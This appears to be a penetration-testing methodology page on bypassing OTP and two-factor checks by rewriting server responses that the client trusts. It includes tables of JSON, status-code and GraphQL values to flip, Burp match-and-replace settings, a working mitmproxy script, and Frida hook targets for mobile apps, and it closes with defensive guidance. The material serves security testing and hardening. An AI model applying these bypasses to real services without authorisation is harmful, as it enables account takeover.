# Response Manipulation

The verification endpoint returns a verdict. If the client (web SPA, mobile app) acts on that verdict without server-side enforcement on the *next* request, you can flip it.

## When this works

- SPA stores `verified=true` in localStorage / Redux after a "success" response, then sends a separate request to perform the gated action. The gated endpoint trusts that flag (or a client-issued token) rather than re-checking OTP state server-side.
- Mobile apps that gate a screen transition on response JSON.
- Multi-step wizards where the next step is fetched via `GET /step3` once step2 says OK.

If the verify endpoint and the action endpoint are the same call (OTP submitted, password changed in one request), response manipulation alone won't help — you need a logic bug instead.

## Patterns to flip

### JSON bodies
```
{"success":false}              → {"success":true}
{"status":"FAILED"}            → {"status":"SUCCESS"}
{"status":"error"}             → {"status":"ok"}
{"verified":false}             → {"verified":true}
{"otpValid":false}             → {"otpValid":true}
{"isValid":false}              → {"isValid":true}
{"valid":0}                    → {"valid":1}
{"code":401,"message":"..."}   → {"code":200,"message":"OK"}
{"errors":[{"msg":"..."}]}     → {"errors":[]}
{"result":"INVALID_OTP"}       → {"result":"VERIFIED"}
{"nextStep":"retry"}           → {"nextStep":"dashboard"}
{"mfaRequired":true}           → {"mfaRequired":false}
{"redirect":"/2fa"}            → {"redirect":"/account"}
```

### Status codes
```
HTTP/1.1 401 Unauthorized      → HTTP/1.1 200 OK
HTTP/1.1 400 Bad Request       → HTTP/1.1 200 OK
HTTP/1.1 403 Forbidden         → HTTP/1.1 200 OK
HTTP/1.1 302 → /retry          → HTTP/1.1 302 → /dashboard
```

### GraphQL
```
{"data":{"verifyOtp":{"success":false,"token":null}}}
  → {"data":{"verifyOtp":{"success":true,"token":"<any>"}}}

{"data":null,"errors":[{"message":"Invalid OTP"}]}
  → {"data":{"verifyOtp":{"success":true}},"errors":null}
```

### SAML / SSO
Look for boolean assertions in the response (`AuthnContextClassRef`, custom claims like `mfaCompleted`).

## Tooling

### Burp Suite — Match and Replace
Proxy → Options → Match and Replace → Add:
- Type: `Response body`
- Match: `"success":false`
- Replace: `"success":true`
- Regex match: off (unless needed)

For status-line: Type `Response header`, Match `HTTP/1.1 401 Unauthorized`, Replace `HTTP/1.1 200 OK`.

### Burp — Manual intercept
Proxy → Intercept → enable "Intercept server responses to this request" on the verify call. Edit JSON, forward.

### mitmproxy
```python
# flip.py
from mitmproxy import http
def response(flow: http.HTTPFlow):
    if "/verify-otp" in flow.request.path:
        flow.response.status_code = 200
        flow.response.text = flow.response.text.replace(
            '"success":false', '"success":true'
        ).replace(
            '"otpValid":false', '"otpValid":true'
        )
```
Run: `mitmproxy -s flip.py`

### Frida (mobile)
Hook the JSON parser or the boolean check method directly. Common targets:
- Android: hook `org.json.JSONObject.getBoolean` or the Retrofit response model setter.
- iOS: hook the Swift `Codable` decoder or the specific `isVerified` getter.

## Confirming

A flipped response that "logs you in" but every subsequent authenticated request returns 401 = no bug, the server never trusted the verdict. The bug exists only if you can perform a gated action (read account data, change password, post transaction) after the flip.

## Why it still exists in 2026

The flow looks like:
1. Client sends OTP → server.
2. Server validates → returns JSON.
3. Client redirects to `/dashboard` on success.
4. `/dashboard` checks `session.authenticated` — which was already true from password step.

The MFA gate is purely a client redirect. Server-side authentication completed at step 0. This is the most common variant — look for it whenever 2FA is "added on" to an existing login.

## Defensive note (for blue-teamers reading this)

- The verify endpoint must mutate server-side session state (`session.mfa_passed = true` only after successful OTP check, signed server-side).
- Every gated endpoint must independently check that flag on the server, not trust client navigation.
- Never include the OTP value, expected value, or a "secret" verification token in the response body.
